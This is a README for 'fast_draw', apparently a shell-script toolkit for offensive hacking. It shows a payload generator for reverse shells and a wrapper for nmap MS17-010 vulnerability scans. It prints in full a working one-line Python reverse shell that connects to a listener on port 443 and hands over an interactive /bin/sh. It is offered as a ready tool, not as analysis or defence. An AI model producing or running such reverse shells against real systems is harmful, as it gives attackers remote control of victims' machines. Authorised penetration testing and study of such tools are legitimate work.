# fast_draw

Shellscripts functions to automate stuff in hacking


## How use: 
### Generating payloads: 
#### Listing
```
$ genweapon help
[!] Help menu:
bash list -> List available payloads
bash generate PAYLOAD_PATH LHOST LPORT OUTPUT
	 Example: bash generate payloads/python/reverse_tcp 127.0.0.1 443 /tmp/shell.p
```

#### Creating 
```
$ genweapon generate payloads/python/reverse_tcp 127.0.0.1 443 /tmp/pyshell.py 
[-] Generating the payload
[-] Payload saved at /tmp/pyshell.py
operador@remember:~/scripts/shellscript/fast_draw$ cat /tmp/pyshell.py 
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

### Automating nmap nse scans: 
Syntax: 

```
nse smb target ports 
```

Example: 

```
$ nse ms17-010 192.168.10.10 139,445
sudo nmap -p 139,445 --script=smb-vuln-ms17-010.nse -oN nmap_nse_smb-vuln-ms17-010.nse 192.168.10.10

```
